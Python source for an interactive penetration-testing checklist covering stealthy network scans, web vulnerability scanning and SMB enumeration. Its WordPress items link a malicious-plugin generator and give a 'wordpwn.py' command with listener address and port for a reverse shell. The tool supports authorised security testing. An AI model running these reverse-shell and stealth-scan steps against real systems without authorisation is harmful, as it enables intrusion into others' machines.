
import Session

class ChecklistItem:
    def __init__(self, desc, result = 'NO', notes = ''):
        self._desc = desc
        self._result = result
        self._notes = notes
        return

    def __str__(self):
        return 'Desc: ' + str(self._desc) + '\r\n' + 'Result: ' + self._result + '\r\n' + 'Notes: ' + str(self._notes) + '\r\n\r\n'

class ChecklistManager:
    def __init__(self):
        self._checklistCategories = []
        self._checklistCategories.append(NetworkScanChecklist())
        self._checklistCategories.append(HttpChecklist())
        self._checklistCategories.append(SmbChecklist())

        return

    def __str__(self):
        return ''

    def getChecklists(self):
        return self._checklistCategories

    def setValue(self, categoryName, id, result, notes):
        for category in self._checklistCategories:
            if category._CategoryName == categoryName:
                category.loadResult(id, result, notes)
                return

    def run(self, categoryName):
        for category in self._checklistCategories:
            if category._CategoryName == categoryName:
                category.run()
                return
        
        print('Unable to find category')
        return

    def generateReport(self):
        with open(Session.session.getReportDir() + '/checklists.md','w') as f:
            print('# Checklists', file = f)

            for category in self._checklistCategories:
                print('## ' + category._CategoryName, file = f)

                for i, item in category._items.items():
                    if item._result == 'DONE':
                        print('- [x] ' + item._desc, file = f)
                    else:
                        print('- [ ] ' + item._desc, file = f)

                    if len(item._notes) > 0:
                        print('Notes: ' + item._notes, file = f)

                print('', file = f)

        return

class ChecklistCategoryBase:
    def __init__(self):
        self._CategoryName = ''
        self._items = { }
        self._stopped = False
        return

    def run(self):
        for i, item in self._items.items():
            while True:
                # False is we continue to loop, True is we break, and move on to the next 'item'
                if self.checkItem(i, item) == False:
                    continue;
                else:
                    break
        return

    def checkItem(self, i, item):
        import Session

        self._stopped = False

        if item._result == 'DONE' or item._result == 'N/A' or item._result == 'YES':
            print(str(i) + '. \033[92m' + item._result + '\033[0m (' + item._desc + ')')
            if len(item._notes) > 0:
                print('\033[94mNOTES:\033[0m ' + item._notes)
            return True
        else:
            print(str(i) + '. ' + item._desc)
            if len(item._notes) > 0:
                print('\033[94mNOTES:\033[0m ' + item._notes)

            print('(y/n/na/stop/cmd [CMD]/note [NOTES])')
            result = input()

            if result == 'y' or result == 'Y' or result == 'yes':
                self._items[i]._result = 'DONE'
                print(self._items[i]._result)
                return True
            elif result == 'n' or result == 'N' or result == 'no':
                item._result = 'NO'
                return True
            elif result == 'na' or result == 'NA':
                item._result = 'N/A'
                return True
            elif result == 'stop':
                self._stopped = True
                return
            elif result.startswith('cmd '):
                cmd = result[4:]
                Session.session.runCmdSimple(cmd)
                return False
            elif result.startswith('note '):
                notes = result[5:]
                if len(item._notes) > 0:
                    item._notes += '\r\n' + notes
                else:
                    item._notes = notes
                return False
            else:
                print('Invalid input, type \'stop\' to end the checklist.')
                return False

    def loadResult(self, id, result, notes):
        for i, item in self._items.items():
            if str(i) == str(id):
                item._notes = notes
                item._result = result
                return

class NetworkScanChecklist(ChecklistCategoryBase):
    def __init__(self):
        super().__init__()

        self._CategoryName = 'NetworkScan'
        self._items.update({ 1 : ChecklistItem('Start a version scan in Nmap in Zenmap (nmap -sV 10.0.0.0-100) be sure to save the results') })
        self._items.update({ 2 : ChecklistItem('Use Masscan, and Sparta to get a second scan') })
        self._items.update({ 3 : ChecklistItem('Use Nmap, and Sparta and do a slow, stealthly thrid scan, and be sure to get every port.') })
        self._items.update({ 4 : ChecklistItem('Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)') })
        self._items.update({ 5 : ChecklistItem('Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)') })

        return

    def run(self):
        return super().run()

class HttpChecklist(ChecklistCategoryBase):
    def __init__(self):
        super().__init__()

        self._CategoryName = 'Http'

        #Standard start
        self._items.update({ 1 : ChecklistItem('Run: OpenVAS, Nessus, Nikto and Nexpose') })
        self._items.update({ 2 : ChecklistItem('Run DirBuster, and DIRB to try and get a directory listing') })
        self._items.update({ 3 : ChecklistItem('Identify any CRMs or other web apps running') })
        self._items.update({ 4 : ChecklistItem('Check for virtual domain requirements.  Does the site have links to it\'s own domain?') })
        self._items.update({ 5 : ChecklistItem('Add the domain to the /ect/hosts file') })
        self._items.update({ 6 : ChecklistItem('Check for any pages that allow input, or URLs, and test for bruteforce.') })

        # Wordpress
        self._items.update({ 7 : ChecklistItem('Does this have WP? (y/N)') })
        self._items.update({ 8 : ChecklistItem('Do you have access to the control panel?') })
        self._items.update({ 9 : ChecklistItem('You can use a WP reverse shell if you like (msfvenom required): https://github.com/wetw0rk/malicious-wordpress-plugin') })
        self._items.update({ 10 : ChecklistItem('wordpwn.py [LHOST] [LPORT] [HANDLER]  (HANDLER is Y or N) \r\nwordpwn.py 192.168.0.6 8888 Y\r\nThis will generate a plugin to install, and will listen on your machine for a connection') })
        self._items.update({ 11 : ChecklistItem('Also remember to download any server side code when possible, that way you can look for issues/bugs, or hardcoded passwords') })
        
        self._items.update({ 12 : ChecklistItem('Does this have Flash/Flex? (y/N)') })
        self._items.update({ 13 : ChecklistItem('Utilize \'deblazy.py\' for common checks') })

        return

    def runWordpress(self):
        print(self._items[7]._desc, end = '')
        choice = input()

        if choice.lower() == 'y':
            print('')
            self._items[7]._result = 'YES'

            print(self._items[8]._desc, end = '')       # Do you have access to the control panel?
            choice = input()
            if choice.lower() == 'y':
                print('')
                self._items[8]._result = 'YES'

                count = 9
                while count < 11:
                    if super().checkItem(count, self._items[count]) == False:
                        continue
                    else:
                        count += 1
                        if self._stopped == True:
                            return
            else:
                self._items[8]._result = 'NO'
                self._items[9]._result = 'NO'
                self._items[10]._result = 'NO'
                self._items[11]._result = 'NO'

            print(self._items[12]._desc, end = '')      # Does this have Flash/Flex? (y/N)
            choice = input()
            if choice.lower() == 'y':
                self._items[12]._result = 'YES'
                count = 12
                while count < 12:
                    if super().checkItem(count, self._items[count]) == False:
                        continue
                    else:
                        count += 1
                        if self._stopped == True:
                            return
            else:
                pass

        else:
            self._items[7]._result = 'NO'
            self._items[8]._result = 'NO'
            self._items[9]._result = 'NO'
            self._items[10]._result = 'NO'
            self._items[11]._result = 'NO'
            self._items[12]._result = 'NO'
            self._items[13]._result = 'NO'
        return

    def run(self):
        i = 1
        while i < (len(self._items) + 1):
            if i == 7:                                          # Wordpress stuff
                self.runWordpress()
                i = 13
                continue

            while True:
                if super().checkItem(i, self._items[i]) == False:
                    continue;
                else:
                    if i == 4 and self._stopped == False:    # Setup host file
                        if self._items[i]._result == 'DONE':
                            print('Add the domain to the /ect/hosts file.')
                            print('Example:')
                            print('192.168.1.45 mydomain')
                            print('192.168.1.45 mydomain.com')
                    elif self._stopped == True:
                        return

                    i += 1
                    break
        return

class SmbChecklist(ChecklistCategoryBase):
    def __init__(self):
        super().__init__()

        self._CategoryName = 'Smb'
        self._items.update({ 1 : ChecklistItem('Enumerate using \'enum4linux\'') })

        self._items.update({ 2 : ChecklistItem('Use Masscan, and Sparta to get a second scan') })
        self._items.update({ 3 : ChecklistItem('Find all HTTP servers and run the big 4 scanners on them (Nikto, Nessus, Nexpose, OpenVAS)') })
        self._items.update({ 4 : ChecklistItem('Do a full TCP/UDP slow and silent scan on each machine. (should take about a week)') })

        return

    def run(self):
        return super().run()
